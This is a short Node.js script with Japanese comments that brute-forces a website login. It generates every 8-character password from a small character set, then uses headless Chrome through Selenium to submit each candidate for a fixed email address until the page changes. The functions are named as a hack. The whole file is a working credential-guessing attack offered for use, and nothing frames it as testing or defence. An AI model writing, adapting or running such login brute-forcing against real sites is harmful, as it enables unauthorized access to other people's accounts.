//1.パスワードを自動で生成するスクリプト
const bf = require('bruteforce');
const webdriver = require('selenium-webdriver');
const { Builder, By, until } = webdriver;

const config = require('./config');

const URL = config.URL;
const idStr = 'taro_yamada@gmail.com';
let pwStrPatterns = [];

const capabilities = webdriver.Capabilities.chrome();
capabilities.set('chromeOptions', {
    args: [
        '--headless',
        '--no-sandbox',
        '--disable-gpu',
        `--window-size=1980,1200`
        // other chrome options
    ]
});
const driver = new Builder().withCapabilities(capabilities).build();
let index = 0;
let pwLen;

const handlehack = async () => {

  pwStrPatterns = await bf({
    len: 8,
    // chars: ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z', '1','2','3','4','5','6','7','8','9','0'],
    chars: ['a', '0', 'j', '8', '9', 'b', 'c', 'd'],
    step: console.log
    // len: 3,
    // chars: ['a','b','c', '0', '1', '2']
  });

  //output
  console.log('pwStrPatterns', pwStrPatterns);
  console.log('pwStrPatterns.length', pwStrPatterns.length);
    
  //2.成功するまでひたすらパスワードを入力し、ログインを試し続ける自動スクリプト
  const tryLogin = (callback) => {
    const $id = driver.findElement(By.id('loginInner_u'));
    const $pw = driver.findElement(By.id('loginInner_p'));
    const $trigger = driver.findElement(By.id('js-trigger'));

    $id.sendKeys(idStr);
    console.log('pwStrPatterns', pwStrPatterns);
    console.log('pwStrPatterns[index]', pwStrPatterns[index]);
    $pw.sendKeys(pwStrPatterns[index]);
    
    $trigger.click()
    .then(async () => {

      const currentUrl = await driver.getCurrentUrl();
      if(index < pwLen){
        if(currentUrl === URL){
          // failed
          console.log('index', index);
          index++;
          tryLogin(callback);
        } else {
          //Success
          console.log('Success!');
        }
      } else {
        console.log('filed hack');
        driver.quit();
      }
    })
    .catch((err) => {
      console.log(err);
      driver.quit();
    });
  };

  const autoLogin = () => {
    pwLen = pwStrPatterns.length;
    driver.get(URL)
    .then(tryLogin(tryLogin))
    .catch((err) => {
      console.log(err);
      driver.quit();
    });
  };

  autoLogin();
};
handlehack();